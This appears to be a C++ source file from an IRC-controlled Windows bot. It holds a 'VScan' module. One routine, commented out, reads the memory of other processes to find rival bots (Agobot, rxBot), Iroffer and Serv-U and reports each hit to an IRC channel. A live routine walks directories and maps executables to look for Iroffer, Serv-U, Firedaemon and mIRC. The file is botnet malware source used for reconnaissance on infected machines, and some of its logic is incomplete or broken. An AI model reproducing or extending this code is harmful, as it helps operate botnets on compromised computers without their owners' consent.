#include "includes.h"
#include "functions.h"
#include "vscandef.h"

#ifndef NO_VSCAN
/*
BOOL ScanProcess(HANDLE hReadp, BYTE *Definition, int iSize, int iDif=5);
DWORD WINAPI VScanMemoryThread(LPVOID param)
{
	NTHREAD vs = *((NTHREAD*)param);
	NTHREAD *vss = (NTHREAD *)param;
	vss->gotinfo = TRUE;
	IRC* irc=(IRC*)vs.conn;
	
	DWORD dwStartTime=GetTickCount();
	DWORD dwStopTime=0;
	SetThreadPriority(threads[vs.threadnum].tHandle,THREAD_PRIORITY_IDLE);

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded))
		return FALSE;

	cProcesses=cbNeeded/sizeof(DWORD);
	char szProcessName[MAX_PATH];
	for ( int i = 0; i < cProcesses; i++ )
	{
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
		if (hProcess)
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if (fEnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded))
			{
				
				fGetModuleFileNameEx(hProcess,hMod,szProcessName,sizeof(szProcessName));
				
				if (ScanProcess(hProcess,irofferx,IROFFERX_SIZE))
				{
					irc->privmsg(vs.target,"Found Iroffer: %s:%d",szProcessName,aProcesses[i]);
				}
				
				else if (ScanProcess(hProcess,servux,SERVUX_SIZE))
				{
					irc->privmsg(vs.target,"Found Serv-U: %s:%d",szProcessName,aProcesses[i]);
				}
				
				else if (ScanProcess(hProcess,agox,AGOX_SIZE))
				{
					irc->privmsg(vs.target,"Found Agobot: %s:%d",szProcessName,aProcesses[i]);
				}
				
				else if (ScanProcess(hProcess,rx61,RX61_SIZE))
				{
					irc->privmsg(vs.target,"Found rxBot(1): %s:%d",szProcessName,aProcesses[i]);
				}
				
				else if (ScanProcess(hProcess,rx62,RX62_SIZE))
				{
					irc->privmsg(vs.target,"Found rxBot(2): %s:%d",szProcessName,aProcesses[i]);
				}
				
//				/*printf("Trying Firedaemon 0.9 on %d\n",aProcesses[i]);
//				if (ScanProcess(hProcess,firedaemon09,FIREDAEMON09_SIZE,5))
//				{
//					irc->privmsg(vs.target,"Found Firedaemon 0.9: %s:%d",szProcessName,aProcesses[i]);
//				}
//				
//				printf("Trying Firedaemon 1.6 on %d\n",aProcesses[i]);
//				if (ScanProcess(hProcess,firedaemon16,FIREDAEMON16_SIZE,5))
//				{
//					irc->privmsg(vs.target,"Found Firedaemon 1.6: %s:%d",szProcessName,aProcesses[i]);
//				}
//
//				printf("Trying mIRC on %d\n",aProcesses[i]);
//				if (ScanProcess(hProcess,mirc591,MIRC591_SIZE,5))
//				{
//					irc->privmsg(vs.target,"Found mIRC: %s:%d",szProcessName,aProcesses[i]);
//				}
//				
//				printf("Trying mIRC on %d\n",aProcesses[i]);
//				if (ScanProcess(hProcess,mircx,MIRCX_SIZE,5))
//				{
//					irc->privmsg(vs.target,"Found mIRC: %s:%d",szProcessName,aProcesses[i]);
//				}
			}
			CloseHandle(hProcess);
		}
	}
	irc->privmsg(vs.target,"%s VScan Done.","DEBUG//");
	clearthread(vs.threadnum);
	ExitThread(0);
}

BOOL ScanProcess(HANDLE hReadp, BYTE *Definition, int iSize, int iDif)
{
	//char buf[500000]; //this is the buffer where the read memory is stored
	char buf[124000]; //this is the buffer where the read memory is stored
	DWORD bufsize = sizeof(buf); //here define how much bytes we are gonna read
	DWORD retd = 0;
	
//	The actual reading of the memory address
//	first var is the handle that OpenProcess returned
//	the 0x400000 is the base address (almost)all .exe in win32 use that.
//	the next 2 vars we already discussed them when declaring them.
//	last var returns into a buffer how many bytes where read so if not interested
//	you can leave it NULL
//	
//	if I am correct all processes have memory from 0x000000 till 0xffffff so that would be the whole space you have to read and find possible interesting things in it.

	int ret=ReadProcessMemory(hReadp,(LPCVOID)0x400000, &buf, bufsize,&retd);
	int y=0;
	for(int g=0;g<bufsize;g++)
	{
#ifdef _DEBUG
		if (y>(iSize/2))
			printf("Getting close: %i/%i (%d)\n",y,iSize,retd);
#endif
		if (y>(iSize-iDif))
			return TRUE;
		if ((BYTE)buf[g] == Definition[0])
		{
			for (int i=0,t=g;i<iSize;i++,t++)
			{
				if ((BYTE)buf[t] == Definition[i])
					y++;
			}
		}
		else
			y=0;
	}
	return 0;
}
*/
DWORD ScanFile(DWORD dwBaseAddr,DWORD fSize);
DWORD WINAPI VScanFileThread(LPVOID param)
{
	NTHREAD vs = *((NTHREAD*)param);
	NTHREAD *vss = (NTHREAD *)param;
	vss->gotinfo = TRUE;
	IRC* irc=(IRC*)vs.conn;
	
	HANDLE hFileHandle;//,hFileReadHandle,hFileMap;
	WIN32_FIND_DATA FindData;
	BOOL bScanAll=vs.bdata1, bRecursive=vs.bdata2,
		 bShowErrors=FALSE, bMainThread=FALSE;

	DWORD dwResult;
	HANDLE hFileReadHandle,hFileMap;
	DWORD dwBaseAddr,dwAttr;
	char File[MAX_PATH],tFile[MAX_PATH];

	DWORD dwStartTime=GetTickCount();
	DWORD dwStopTime=0;

	SetThreadPriority(threads[vs.threadnum].tHandle,THREAD_PRIORITY_IDLE);

	char ScanPath[MAX_PATH],CurrentPath[MAX_PATH];
	strncpy(ScanPath,vs.data1,sizeof(ScanPath));

	if (bScanAll || bRecursive) //Recursive needs all files to find the folders
		sprintf(CurrentPath,"%s\\*.*",ScanPath);
	else
		sprintf(CurrentPath,"%s\\*.exe",ScanPath);

	//hFileHandle=FindFirstFile(CurrentPath,&FindData);
	if ((hFileHandle=FindFirstFile(CurrentPath,&FindData))==INVALID_HANDLE_VALUE)
	{
		if (bShowErrors)
			irc->privmsg(vss->target,"VSCAN// Failed to find first file: \"%s\", error: <%d>",CurrentPath,GetLastError());

		clearthread(vs.threadnum);
		ExitThread(0);
	}
			
	BOOL bContinue=TRUE;
	while (bContinue)
	{
		if((FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
		{
			sprintf(tFile,_T("%s%s"),ScanPath,FindData.cFileName);
			
			if(bRecursive && !bScanAll && !strstr(FindData.cFileName,".exe"))
			{
				//PrintError("Not EXE",FindData.cFileName);
				bContinue=FindNextFile(hFileHandle,&FindData);
				//SkippedType++;
				continue;
			}
			if(FindData.nFileSizeLow==0) {
				//PrintError("Size == 0b",FindData.cFileName);
				//PrintError("Size == 0b",File);
				bContinue=FindNextFile(hFileHandle,&FindData);
				//SkippedSize++;
				continue;
			}
			
			if (FindData.nFileSizeLow>=5242880)		//5mb
		  //if (FindData.nFileSizeLow>=10485760)	//10mb
			{
			//	if (bShowErrors)
			//		PrintError("Size >= 5mb",File);
			//	if (bShowErrors) PrintError("Size >= 10mb",File);
				bContinue=FindNextFile(hFileHandle,&FindData);
			//	SkippedSize++;
				continue;
			}

			dwAttr=GetFileAttributes(File);
			SetFileAttributes(File,FILE_ATTRIBUTE_NORMAL);
			hFileReadHandle=CreateFile(File,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
			if(hFileReadHandle==INVALID_HANDLE_VALUE) {
				if (bShowErrors)
					irc->privmsg(vss->target,"VSCAN// Failed to access file: \"%s\", error: <%d>",File,GetLastError());

				bContinue=FindNextFile(hFileHandle,&FindData);
				//ErrorCreateFile++;
				continue;
			}
			hFileMap=CreateFileMapping(hFileReadHandle,NULL,PAGE_READWRITE,0,FindData.nFileSizeLow,0);
			if(hFileMap==NULL)
			{
				if (bShowErrors)
					irc->privmsg(vss->target,"VSCAN// Failed to create mapping of file: \"%s\", error: <%d>",File,GetLastError());

				bContinue=FindNextFile(hFileHandle,&FindData);
				//ErrorCreateFileMapping++;
				continue;
			}
			dwBaseAddr=(DWORD)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,FindData.nFileSizeLow);
			if(dwBaseAddr==NULL)
			{
				if (bShowErrors)
					irc->privmsg(vss->target,"VSCAN// Failed to map view of file: \"%s\", error: <%d>",File,GetLastError());

				bContinue=FindNextFile(hFileHandle,&FindData);
				//ErrorMapViewOfFile++;
				continue;
			}
			//FilesScanned++;
			
/*
#ifdef _DEBUG
			dwScanStop=0;dwScanStart=0;
			dwScanStart=GetTickCount();
#endif
*/
			dwResult=ScanFile(dwBaseAddr,FindData.nFileSizeLow);
/*
#ifdef _DEBUG
			dwScanStop=GetTickCount();
			CString TotalTime=GetTotalTime(dwScanStart,dwScanStop);
			LPTSTR tTTime=TotalTime.GetBuffer(6);
			TotalTime.ReleaseBuffer();
			std::cout<<"CFindThread::ThreadHandle - Scan done: "<<tTTime<<std::endl;
#endif*/
//			HandleScanResult(dwResult,File);

			UnmapViewOfFile((VOID *)dwBaseAddr);
			CloseHandle(hFileMap);
			CloseHandle(hFileReadHandle);
			SetFileAttributes(File,dwAttr);
		}
		else
		{
			if (bRecursive)
			{
				if (strcmp(FindData.cFileName,".")==0 || strcmp(FindData.cFileName,"..")==0) {
					bContinue=FindNextFile(hFileHandle,&FindData);
					continue;
				}
				//start a new thread
			}

		}
		bContinue=FindNextFile(hFileHandle,&FindData);
	}
	FindClose(hFileHandle);

	clearthread(vs.threadnum);
	ExitThread(0);
}

BOOL AVScan(BYTE *Definition, int iSize, BYTE *Scale, DWORD dwBaseAddr, long lSize, int iDif=5);
BOOL AVScan(BYTE *Definition, int iSize, BYTE *Scale, DWORD dwBaseAddr, long lSize, int iDif/*=5*/)
{	int bCount=0;
	for(int h=0;h<iSize;h++) {
		if((unsigned long)(Scale + h) >= (dwBaseAddr + lSize)) {
			break;
		}
		if(*(Scale + h) == Definition[h]) {
			bCount++;
		}
	}
	if(bCount >= (iSize-iDif)) {
//#ifdef _DEBUG
//		cout<<"CFindThread::AVScan - bCount: "<<bCount<<", iSize-"<<iDif<<": "<<(iSize-iDif)<<endl;
//#endif
		return TRUE;
	}
	return FALSE;
}

DWORD ScanFile(DWORD dwBaseAddr,DWORD fSize)
{
	register BYTE *scale;
	char size_1[10];
	register long size_2; //register variable for faster access
	register int g;//,h,count;

//#ifdef _DEBUG
//	std::cout<<std::endl<<"CFindThread::ScanFile - Starting scan: "<<fSize<<",\t"<<dwBaseAddr<<std::endl;
//#endif

	scale = (unsigned char *)dwBaseAddr;
	sprintf(size_1,"%i",fSize);
	size_2 = atoi(size_1);
	for(g = 0;g < size_2 - 20;g++) {
		
		if (AVScan(irofferx,IROFFERX_SIZE,scale,dwBaseAddr,size_2,0))
			return FOUND_IROFFER;
		
		else if (AVScan(servux,SERVUX_SIZE,scale,dwBaseAddr,size_2,0))
			return FOUND_SERVU;

		else if (AVScan(firedaemon09,FIREDAEMON09_SIZE,scale,dwBaseAddr,size_2))
			return FOUND_FIREDAEMON09;
		
		else if (AVScan(firedaemon16,FIREDAEMON16_SIZE,scale,dwBaseAddr,size_2))
			return FOUND_FIREDAEMON16;
		
		else if (AVScan(mirc591,MIRC591_SIZE,scale,dwBaseAddr,size_2))
			return FOUND_MIRC591;
		
		else if (AVScan(mirc603,MIRC603_SIZE,scale,dwBaseAddr,size_2))
			return FOUND_MIRC603;

		scale++;
	}
	return(FOUND_NONE);
}

#endif